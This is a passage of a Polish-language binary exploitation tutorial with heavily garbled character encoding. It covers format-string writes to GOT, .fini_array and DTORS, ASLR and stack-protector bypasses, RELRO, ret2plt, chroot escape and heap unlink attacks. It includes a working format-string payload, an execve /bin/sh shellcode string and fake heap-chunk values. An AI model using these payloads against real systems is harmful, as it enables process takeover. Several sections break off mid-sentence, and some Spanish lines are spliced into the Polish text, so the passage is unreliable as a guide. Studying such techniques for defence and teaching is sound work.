MoÅ¼esz zobaczyÄ‡ adresy PLT za pomocÄ… **`objdump -j .plt -d ./vuln_binary`**

### **Przebieg ataku**

Jak juÅ¼ wyjaÅ›niono, celem bÄ™dzie **nadpisanie adresu funkcji** w tabeli GOT, ktÃ³ra zostanie wywoÅ‚ana pÃ³Åºniej. Idealnie byÅ‚oby ustawiÄ‡ **adres na shellcode** znajdujÄ…cy siÄ™ w sekcji wykonywalnej, ale prawdopodobnie nie bÄ™dziesz w stanie napisaÄ‡ shellcode w sekcji wykonywalnej.\
InnÄ… opcjÄ… jest **nadpisanie funkcji**, ktÃ³ra **otrzymuje** swoje **argumenty** od **uÅ¼ytkownika** i **skierowanie** jej do funkcji **`system`**.

Aby zapisaÄ‡ adres, zazwyczaj wykonuje siÄ™ 2 kroki: Najpierw **zapisuje siÄ™ 2 bajty** adresu, a nastÄ™pnie pozostaÅ‚e 2. Do tego uÅ¼ywa siÄ™ **`$hn`**.

**HOB** odnosi siÄ™ do 2 starszych bajtÃ³w adresu\
**LOB** odnosi siÄ™ do 2 mÅ‚odszych bajtÃ³w adresu

Zatem, ze wzglÄ™du na to, jak dziaÅ‚a format string, musisz **najpierw zapisaÄ‡ mniejszy** z \[HOB, LOB], a nastÄ™pnie drugi.

JeÅ›li HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

JeÅ›li HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Szablon ataku format string**

MoÅ¼esz znaleÅºÄ‡ **szablon** do ataku na GOT za pomocÄ… format-strings tutaj:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

W zasadzie jest to struktura zawierajÄ…ca **funkcje, ktÃ³re zostanÄ… wywoÅ‚ane** przed zakoÅ„czeniem programu. Jest to interesujÄ…ce, jeÅ›li moÅ¼na wywoÅ‚aÄ‡ **shellcode, skaczÄ…c do adresu**, lub w przypadkach, gdy trzeba wrÃ³ciÄ‡ do gÅ‚Ã³wnego programu, aby **ponownie wykorzystaÄ‡ format string**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
ZauwaÅ¼, Å¼e to **nie spowoduje** **wiecznej pÄ™tli**, poniewaÅ¼ gdy wrÃ³cisz do funkcji gÅ‚Ã³wnej, canary zauwaÅ¼y, Å¼e koniec stosu moÅ¼e byÄ‡ uszkodzony i funkcja nie zostanie ponownie wywoÅ‚ana. DziÄ™ki temu bÄ™dziesz mÃ³gÅ‚ **wykonaÄ‡ 1 dodatkowe** podatne wykonanie.

### **Formatowanie ciÄ…gÃ³w znakÃ³w do wycieku zawartoÅ›ci**

Formatowanie ciÄ…gÃ³w znakÃ³w moÅ¼e rÃ³wnieÅ¼ byÄ‡ wykorzystane do **wycieku zawartoÅ›ci** z pamiÄ™ci programu.\
Na przykÅ‚ad, w nastÄ™pujÄ…cej sytuacji lokalna zmienna na stosie wskazuje na flagÄ™. JeÅ›li **znajdziesz** w **pamiÄ™ci** **wskaÅºnik** do **flagi**, moÅ¼esz sprawiÄ‡, Å¼e **printf** uzyska dostÄ™p do tego **adresu** i **wyÅ›wietli** flagÄ™:

WiÄ™c flaga jest pod adresem **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Z wycieku moÅ¼esz zobaczyÄ‡, Å¼e **wskaÅºnik do flagi** znajduje siÄ™ w **8. parametrze**:

![](<../../.gitbook/assets/image (623).png>)

WiÄ™c, **uzyskujÄ…c dostÄ™p** do **8. parametru**, moÅ¼esz otrzymaÄ‡ flagÄ™:

![](<../../.gitbook/assets/image (624).png>)

ZauwaÅ¼, Å¼e po **poprzednim ataku** i zrozumieniu, Å¼e moÅ¼esz **wyciekaÄ‡ zawartoÅ›Ä‡**, moÅ¼esz **ustawiÄ‡ wskaÅºniki** na **`printf`** w sekcji, w ktÃ³rej jest **zaÅ‚adowany** plik wykonywalny i **caÅ‚kowicie go wyciekaÄ‡**!

### **DTOR**

{% hint style="danger" %}
Obecnie jest bardzo **rzadko spotkaÄ‡ binarny plik z sekcjÄ… dtor**.
{% endhint %}

Destruktory to funkcje, ktÃ³re sÄ… **wykonywane przed zakoÅ„czeniem programu**.\
JeÅ›li uda ci siÄ™ **zapisaÄ‡** adres **shellcode** w **`__DTOR_END__`**, zostanie on **wykonany** przed zakoÅ„czeniem programu.\
Aby uzyskaÄ‡ adres tej sekcji, uÅ¼yj:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
Zazwyczaj sekcjÄ™ **DTOR** znajdziesz **miÄ™dzy** wartoÅ›ciami `ffffffff` i `00000000`. JeÅ›li widzisz tylko te wartoÅ›ci, oznacza to, Å¼e **nie ma zarejestrowanej Å¼adnej funkcji**. Aby jÄ… uruchomiÄ‡, **nadpisz** wartoÅ›Ä‡ **`00000000`** adresem **shellcode**.

### **Formatowanie ciÄ…gÃ³w znakÃ³w do przepeÅ‚nienia bufora**

Funkcja **sprintf** przenosi sformatowany ciÄ…g znakÃ³w do zmiennej. MoÅ¼na wykorzystaÄ‡ **formatowanie** ciÄ…gu znakÃ³w do spowodowania **przepeÅ‚nienia bufora w zmiennej** do ktÃ³rej jest kopiowany. Na przykÅ‚ad Å‚adunek `%.44xAAAA` zapisze **44B+"AAAA" w zmiennej**, co moÅ¼e spowodowaÄ‡ przepeÅ‚nienie bufora.

### **Struktury \_\_atexit**

{% hint style="danger" %}
Obecnie jest to bardzo **rzadkie do wykorzystania**.
{% endhint %}

**`atexit()`** to funkcja, do ktÃ³rej przekazywane sÄ… **inne funkcje jako parametry**. Te **funkcje** zostanÄ… **wykonane** podczas wywoÅ‚ania **`exit()`** lub **zakoÅ„czenia** funkcji **main**. JeÅ›li moÅ¼na **zmodyfikowaÄ‡** **adres** dowolnej z tych **funkcji**, aby wskazywaÅ‚ na shellcode na przykÅ‚ad, moÅ¼na **uzyskaÄ‡ kontrolÄ™** nad **procesem**, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji**, ktÃ³re majÄ… byÄ‡ wykonane, sÄ… **ukryte** za kilkoma strukturami, a na koÅ„cu adres, na ktÃ³ry wskazuje, nie jest adresem funkcji, ale jest **zaszyfrowany za pomocÄ… operacji XOR** i przesuniÄ™Ä‡ z **losowym kluczem**. Dlatego obecnie ten wektor ataku jest **niewielce przydatny, przynajmniej na x86** i **x64\_86**.\
Funkcja **szyfrujÄ…ca** to **`PTR_MANGLE`**. **Inne architektury**, takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementujÄ… funkcji szyfrujÄ…cej**, poniewaÅ¼ **zwracajÄ… to samo**, co otrzymujÄ… jako dane wejÅ›ciowe. Dlatego te architektury mogÄ… byÄ‡ podatne na ten wektor ataku.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie jest to bardzo **rzadkie do wykorzystania**.
{% endhint %}

**`Setjmp()`** pozwala na **zapisanie** **kontekstu** (rejestrÃ³w)\
**`longjmp()`** pozwala na **przywrÃ³cenie** **kontekstu**.\
Zapisane rejestry to: `EBX, ESI, EDI, ESP, EIP, EBP`\
Problem polega na tym, Å¼e EIP i ESP sÄ… przekazywane przez funkcjÄ™ **`PTR_MANGLE`**, wiÄ™c **architektura podatna na ten atak jest taka sama jak powyÅ¼ej**.\
SÄ… one przydatne do obsÅ‚ugi bÅ‚Ä™dÃ³w lub przerwaÅ„.\
Jednak z tego, co przeczytaÅ‚em, inne rejestry nie sÄ… chronione, **wiÄ™c jeÅ›li wewnÄ…trz wywoÅ‚ywanej funkcji wystÄ™puje `call ebx`, `call esi` lub `call edi`**, moÅ¼na przejÄ…Ä‡ kontrolÄ™. MoÅ¼na rÃ³wnieÅ¼ zmodyfikowaÄ‡ EBP, aby zmodyfikowaÄ‡ ESP.

**VTable i VPTR w C++**

KaÅ¼da klasa ma **Vtable**, ktÃ³ra jest tablicÄ… **wskaÅºnikÃ³w do metod**.

KaÅ¼dy obiekt **klasy** ma **VPtr**, ktÃ³ry jest **wskaÅºnikiem** do tablicy swojej klasy. VPtr jest czÄ™Å›ciÄ… nagÅ‚Ã³wka kaÅ¼dego obiektu, wiÄ™c jeÅ›li osiÄ…gniÄ™to **nadpisanie** VPtr, moÅ¼na go **zmodyfikowaÄ‡**, aby wskazywaÅ‚ na metodÄ™ zastÄ™pczÄ…, dziÄ™ki czemu wykonanie funkcji przeniesie siÄ™ do shellcode.

## **Åšrodki zapobiegawcze i uniki**

**ASLR nie tak losowe**

PaX dzieli przestrzeÅ„ adresowÄ… procesu na 3 grupy:

Kod i dane zainicjowane i niezainicjowane: .text, .data i .bss â€”> 16 bitÃ³w entropii w zmiennej delta\_exec, ta zmienna jest inicjowana losowo przy kaÅ¼dym procesie i dodawana do adresÃ³w poczÄ…tkowych

PamiÄ™Ä‡ przydzielona przez mmap() i biblioteki wspÃ³Å‚dzielone â€”> 16 bitÃ³w, delta\_mmap

Stos â€”> 24 bity, delta\_stack â€”> W rzeczywistoÅ›ci 11 (od 10 do 20 wÅ‚Ä…cznie) â€”> wyrÃ³wnany do 16 bajtÃ³w â€”> 524288 moÅ¼liwych rzeczywistych adresÃ³w stosu

Zmienne Å›rodowiskowe i argumenty przesuwane sÄ… mniej niÅ¼ bufor na stosie.

**Return-into-printf**

Jest to technika zamiany przepeÅ‚nienia bufora na bÅ‚Ä…d formatu ciÄ…gu znakÃ³w. Polega na zmianie EIP, aby wskazywaÅ‚ na printf funkcji i przekazaniu sfaÅ‚szowanego ciÄ…gu formatujÄ…cego jako argumentu, aby uzyskaÄ‡ informacje o stanie procesu.

**Atak na biblioteki**

Biblioteki majÄ… pozycjÄ™ z 16-bitowÄ… losowoÅ›ciÄ… = 65636 moÅ¼liwych adresÃ³w. JeÅ›li podatny serwer wywoÅ‚uje fork(), przestrzeÅ„ adresowa pamiÄ™ci jest kopiowana do procesu potomnego i pozostaje nietkniÄ™ta. MoÅ¼na wiÄ™c sprÃ³bowaÄ‡ przeprowadziÄ‡ atak brute force na funkcjÄ™ usleep() z biblioteki libc, przekazujÄ…c jej argument "16", aby znaleÅºÄ‡ tÄ™ funkcjÄ™, gdy zajmie wiÄ™cej czasu niÅ¼ zwykle na odpowiedÅº. ZnajÄ…c pozycjÄ™ tej funkcji, moÅ¼na uzyskaÄ‡ delta\_mmap i obliczyÄ‡ pozostaÅ‚e.

Jedynym pewnym sposobem sprawdzenia, czy ASLR dziaÅ‚a, jest uÅ¼ycie architektury 64-bitowej. Tam nie ma atakÃ³w brute force.

**StackGuard i StackShield**

**StackGuard** wstawia przed EIP â€”> 0x000aff0d(null, \n, EndOfFile(EOF), \r) â€”> Nadal podatne sÄ… recv(), memcpy(), read(), bcoy() i nie chroni EBP

**StackShield** jest bardziej zaawansowany niÅ¼ StackGuard

Zapisuje w tabeli (Global Return Stack) wszystkie adresy EIP powrotne, dziÄ™ki czemu przepeÅ‚nienie bufora nie powoduje Å¼adnych szkÃ³d. Ponadto, moÅ¼na porÃ³wnaÄ‡ oba adresy, aby sprawdziÄ‡, czy wystÄ…piÅ‚o przepeÅ‚nienie.

MoÅ¼na rÃ³wnieÅ¼ sprawdziÄ‡ adres powrotu za pomocÄ… wartoÅ›ci granicznej, wiÄ™c jeÅ›li EIP przechodzi do innego miejsca niÅ¼ zwykle, takiego jak przestrzeÅ„ danych, bÄ™dzie wiadomo. Ale moÅ¼na to obejÅ›Ä‡ za pomocÄ… Ret-to-lib, ROP lub ret2ret.

Jak widaÄ‡, stackshield rÃ³wnieÅ¼ nie chroni zmiennych lokalnych.

**Stack Smash Protector (ProPolice) -fstack-protector**

Canary jest umieszczany przed EBP. Przeorganizowuje zmienne lokalne, aby bufory byÅ‚y na najwyÅ¼szych pozycjach i nie mogÅ‚y nadpisywaÄ‡ innych zmiennych.

Dodatkowo, wykonuje bezpiecznÄ… kopiÄ™ przekazanych argumentÃ³w nad zmiennymi lokalnymi i uÅ¼ywa tych kopii jako argumentÃ³w.

Nie moÅ¼e chroniÄ‡ tablic o mniej niÅ¼ 8 elementach ani buforÃ³w bÄ™dÄ…cych czÄ™Å›ciÄ… struktury uÅ¼ytkownika.

Canary to losowa liczba pobrana z "/dev/urandom" lub jeÅ›li nie jest dostÄ™pna, to 0xff0a0000. Przechowywana jest w TLS (Thread Local Storage). WÄ…tki dzielÄ… tÄ™ samÄ… przestrzeÅ„ pamiÄ™ci, a TLS to obszar zawierajÄ…cy zmienne globalne lub statyczne dla kaÅ¼dego wÄ…tku. Jednak poczÄ…tkowo sÄ… one kopiowane z procesu macierzystego, chociaÅ¼ proces potomny moÅ¼e zmieniaÄ‡ te dane bez zmiany danych rodzica ani innych dzieci. Problem polega na tym, Å¼e
### Relro

**Relro (Read only Relocation)** wpÅ‚ywa na uprawnienia pamiÄ™ci podobnie jak NX. RÃ³Å¼nica polega na tym, Å¼e podczas gdy NX czyni stos wykonywalnym, RELRO czyni **pewne rzeczy tylko do odczytu**, wiÄ™c nie moÅ¼emy ich zapisywaÄ‡. NajczÄ™stszy sposÃ³b, w jaki widziaÅ‚em, Å¼e to stanowi przeszkodÄ™, polega na uniemoÅ¼liwieniu nam **nadpisania tabeli `got`**, o czym bÄ™dzie mowa pÃ³Åºniej. Tabela `got` przechowuje adresy funkcji libc, dziÄ™ki czemu binarny plik wie, jakie sÄ… te adresy i moÅ¼e je wywoÅ‚aÄ‡. Zobaczmy, jak wyglÄ…dajÄ… uprawnienia pamiÄ™ci dla wpisu w tabeli `got` dla binarnego pliku z i bez relro.

Z relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Dla binarnego pliku **bez relro** moÅ¼emy zobaczyÄ‡, Å¼e adres wpisu `got` dla funkcji `fgets` to `0x404018`. PatrzÄ…c na mapowanie pamiÄ™ci, widzimy, Å¼e mieÅ›ci siÄ™ miÄ™dzy `0x404000` a `0x405000`, co oznacza, Å¼e ma uprawnienia **`rw`**, co oznacza, Å¼e moÅ¼emy go odczytywaÄ‡ i zapisywaÄ‡. Dla binarnego pliku **z relro**, widzimy, Å¼e adres tabeli `got` dla uruchomienia binarnego (pie jest wÅ‚Ä…czone, wiÄ™c ten adres siÄ™ zmieni) to `0x555555557fd0`. W mapowaniu pamiÄ™ci tego binarnego mieÅ›ci siÄ™ miÄ™dzy `0x0000555555557000` a `0x0000555555558000`, co oznacza, Å¼e ma uprawnienia pamiÄ™ci **`r`**, co oznacza, Å¼e moÅ¼emy tylko odczytywaÄ‡.

WiÄ™c jaki jest **sposÃ³b obejÅ›cia**? Typowe obejÅ›cie, ktÃ³re stosujÄ™, to po prostu nie zapisuj do obszarÃ³w pamiÄ™ci, ktÃ³re relro powoduje, Å¼e sÄ… tylko do odczytu, i **znajdÅº innÄ… metodÄ™ wykonania kodu**.

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e aby to siÄ™ staÅ‚o, binarny plik musi znaÄ‡ wczeÅ›niej adresy funkcji:

* OpÃ³Åºnione wiÄ…zanie: Adres funkcji jest wyszukiwany przy pierwszym wywoÅ‚aniu funkcji. Dlatego GOT musi mieÄ‡ uprawnienia do zapisu podczas wykonywania.
* WiÄ…zanie teraz: Adresy funkcji sÄ… rozwiÄ…zywane na poczÄ…tku wykonywania, a nastÄ™pnie nadawane sÄ… uprawnienia tylko do odczytu dla sekcji wraÅ¼liwych, takich jak .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Aby sprawdziÄ‡, czy program uÅ¼ywa WiÄ…zania teraz, moÅ¼na to zrobiÄ‡:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Kiedy binarny jest Å‚adowany do pamiÄ™ci i funkcja jest wywoÅ‚ywana po raz pierwszy, skacze siÄ™ do PLT (Procedure Linkage Table), a stamtÄ…d nastÄ™puje skok (jmp) do GOT i odkrywa, Å¼e ten wpis nie zostaÅ‚ rozwiÄ…zany (zawiera nastÄ™pnÄ… adres z PLT). NastÄ™pnie wywoÅ‚uje Runtime Linker lub rtfd, aby rozwiÄ…zaÅ‚ adres i zapisaÅ‚ go w GOT.

Podczas wywoÅ‚ywania funkcji, wywoÅ‚ywana jest PLT, ktÃ³ra zawiera adres GOT, w ktÃ³rym przechowywany jest adres funkcji, wiÄ™c przekierowuje przepÅ‚yw tam i wywoÅ‚uje funkcjÄ™. Jednak jeÅ›li jest to pierwsze wywoÅ‚anie funkcji, to co jest w GOT to nastÄ™pna instrukcja z PLT, dlatego przepÅ‚yw podÄ…Å¼a za kodem PLT (rtfd) i dowiaduje siÄ™ adresu funkcji, zapisuje go w GOT i wywoÅ‚uje.

Podczas Å‚adowania binarnego do pamiÄ™ci, kompilator mÃ³wi mu, na jakim przesuniÄ™ciu naleÅ¼y umieÅ›ciÄ‡ dane, ktÃ³re majÄ… byÄ‡ zaÅ‚adowane podczas uruchamiania programu.

Lazy binding -> Adres funkcji jest wyszukiwany tylko przy pierwszym wywoÅ‚aniu tej funkcji, dlatego GOT ma uprawnienia do zapisu, aby, gdy zostanie wyszukany, zostanie tam zapisany i nie trzeba go ponownie wyszukiwaÄ‡.

Bind now -> Adresy funkcji sÄ… wyszukiwane podczas Å‚adowania programu i zmieniane sÄ… uprawnienia sekcji .got, .dtors, .ctors, .dynamic, .jcr na tylko do odczytu. -z relro i -z now

Mimo to, ogÃ³lnie rzecz biorÄ…c, programy nie sÄ… skomplikowane z tymi opcjami, wiÄ™c te ataki nadal sÄ… moÅ¼liwe.

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> Aby sprawdziÄ‡, czy uÅ¼ywajÄ… BIND NOW

Fortify Source -D_FORTIFY_SOURCE=1 lub =2

PrÃ³buje zidentyfikowaÄ‡ funkcje, ktÃ³re kopiujÄ… dane z jednego miejsca do drugiego w sposÃ³b niebezpieczny i zamienia funkcjÄ™ na bezpiecznÄ… funkcjÄ™.

Na przykÅ‚ad:
char buf[16];
strcpy(buf, source);

Rozpoznaje to jako niebezpieczne i zamienia strcpy() na __strcpy_chk(), uÅ¼ywajÄ…c rozmiaru bufora jako maksymalnego rozmiaru do skopiowania.

RÃ³Å¼nica miÄ™dzy =1 a =2 polega na tym, Å¼e:

Druga nie pozwala na to, aby %n pochodziÅ‚o z sekcji z uprawnieniami do zapisu. Ponadto, parametr dla bezpoÅ›redniego dostÄ™pu do argumentÃ³w moÅ¼e byÄ‡ uÅ¼ywany tylko wtedy, gdy uÅ¼ywane sÄ… wczeÅ›niejsze, czyli moÅ¼na uÅ¼yÄ‡ %3$d tylko jeÅ›li wczeÅ›niej uÅ¼yto %2$d i %1$d.

Aby wyÅ›wietliÄ‡ komunikat o bÅ‚Ä™dzie, uÅ¼ywa siÄ™ argv[0], wiÄ™c jeÅ›li podasz tam adres innego miejsca (takiego jak zmienna globalna), komunikat o bÅ‚Ä™dzie pokaÅ¼e zawartoÅ›Ä‡ tej zmiennej. Strona 191

ZastÄ…pienie Libsafe

Aktywuje siÄ™ to za pomocÄ…: LD_PRELOAD=/lib/libsafe.so.2
lub
"/lib/libsave.so.2" > /etc/ld.so.preload

NiektÃ³re niebezpieczne wywoÅ‚ania funkcji sÄ… przechwytywane przez inne bezpieczne wywoÅ‚ania. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla kompilacji statycznych, nie wszystkie podatne funkcje stajÄ… siÄ™ bezpieczne, a LD_PRELOAD nie dziaÅ‚a w binarnych z suid).

ASCII Armored Address Space

Polega na Å‚adowaniu wspÃ³Å‚dzielonych bibliotek od 0x00000000 do 0x00ffffff, aby zawsze istniaÅ‚ bajt 0x00. JednakÅ¼e, to naprawdÄ™ nie zatrzymuje praktycznie Å¼adnego ataku, a tym bardziej w little endian.

ret2plt

Polega na wykonaniu ROP w taki sposÃ³b, Å¼e wywoÅ‚ywana jest funkcja strcpy@plt (z plt) i wskaÅºnik jest skierowany do wpisu w GOT, a nastÄ™pnie kopiowany jest pierwszy bajt funkcji, do ktÃ³rej chcemy siÄ™ odwoÅ‚aÄ‡ (system()). NastÄ™pnie to samo jest robione, kierujÄ…c siÄ™ na GOT+1 i kopiujÄ…c drugi bajt system()... Na koniec jest wywoÅ‚ywany adres przechowywany w GOT, ktÃ³ry bÄ™dzie systemem().

Falso EBP

Dla funkcji, ktÃ³re uÅ¼ywajÄ… EBP jako rejestru wskazujÄ…cego na argumenty, po zmodyfikowaniu EIP i wskazaniu na system(), EBP rÃ³wnieÅ¼ musi zostaÄ‡ zmieniony, aby wskazywaÅ‚ na obszar pamiÄ™ci zawierajÄ…cy 2 dowolne bajty, a nastÄ™pnie adres &"/bin/sh".

Klatki z chroot()

debootstrap -arch=i386 hardy /home/user -> Instaluje podstawowy system w okreÅ›lonym podkatalogu

Administrator moÅ¼e wyjÅ›Ä‡ z takiej klatki, wykonujÄ…c: mkdir foo; chroot foo; cd ..

Instrumentacja kodu

Valgrind -> Szuka bÅ‚Ä™dÃ³w
Memcheck
RAD (Return Address Defender)
Insure++

## **8 PrzepeÅ‚nienia sterty: Podstawowe ataki**

Przydzielony fragment

prev_size |
size | - NagÅ‚Ã³wek
*mem | Dane

Wolny fragment

prev_size |
size |
*fd | WskaÅºnik do przodu
*bk | WskaÅºnik do tyÅ‚u - NagÅ‚Ã³wek
*mem | Dane

Wolne fragmenty sÄ… przechowywane w liÅ›cie dwukierunkowej (bin) i nigdy nie mogÄ… wystÄ™powaÄ‡ dwa wolne fragmenty obok siebie (sÄ… Å‚Ä…czone).

W polu "size" sÄ… bity wskazujÄ…ce: czy poprzedni fragment jest uÅ¼ywany, czy fragment zostaÅ‚ przydzielony za pomocÄ… mmap() i czy fragment naleÅ¼y do gÅ‚Ã³wnego obszaru.

JeÅ›li podczas zwalniania fragmentu ktÃ³rykolwiek z sÄ…siednich fragmentÃ³w jest wolny, sÄ… one Å‚Ä…czone za pomocÄ… makra unlink() i najwiÄ™kszy nowy fragment jest przekazywany do frontlink() w celu wstawienia go do odpowiedniego binu.

unlink(){
BK = P->bk; -> BK nowego fragmentu to ten, ktÃ³ry miaÅ‚ juÅ¼ wczeÅ›niej wolny fragment
FD = P->fd; -> FD nowego fragmentu to ten, ktÃ³ry miaÅ‚ juÅ¼ wczeÅ›niej wolny fragment
FD->bk = BK; -> BK nastÄ™pnego fragmentu wskazuje na nowy fragment
BK->fd = FD; -> FD poprzedniego fragmentu wskazuje na nowy fragment
}

Dlatego jeÅ›li uda nam siÄ™ zmodyfikowaÄ‡ P->bk adresem shellcode i P->fd adresem wpisu w GOT lub DTORS pomniejszonym o 12, osiÄ…gniemy:

BK = P->bk = &shellcode
FD = P->fd = &__dtor_end__ - 12
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

W ten sposÃ³b po wyjÅ›ciu z programu zostanie wykonany shellcode.

Dodatkowo, czwarte polecenie unlink() zapisuje coÅ›, a shellcode musi byÄ‡ dostosowany do tego:

BK->fd = FD -> *((&shellcode + 8) = (&__dtor_end__ - 12) -> Spowoduje to zapisanie 4 bajtÃ³w od 8 bajtu shellcode, dlatego pierwsza instrukcja shellcode musi byÄ‡ skokiem, aby ominÄ…Ä‡ to i przejÅ›Ä‡ do nops, ktÃ³re prowadzÄ… do reszty shellcode.

Dl
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo estÃ¡ libre estÃ© a 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, para que piense que el â€œsizeâ€ del 3Âº trozo estÃ¡ 4bytes detrÃ¡s (apunta a prev\_size) pues es ahÃ­ donde mira si el 2Âº trozo estÃ¡ libre**

